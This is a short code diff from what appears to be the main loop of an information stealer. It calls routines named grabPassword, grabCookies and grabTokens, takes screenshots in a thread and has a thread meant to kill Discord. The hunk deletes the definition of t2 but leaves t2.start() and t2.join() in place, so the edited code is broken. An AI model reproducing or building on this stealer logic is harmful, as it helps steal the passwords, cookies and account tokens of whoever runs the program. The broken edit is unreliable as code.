@@ -38,7 +38,6 @@ while(1):
                 self.grabPassword()
                 self.grabCookies()
             t = Thread(target=self.screenshot)
-            t2 = Thread(target=self.killDiscord)
             t.start();t.join()
             t2.start();t2.join()
             self.grabTokens()
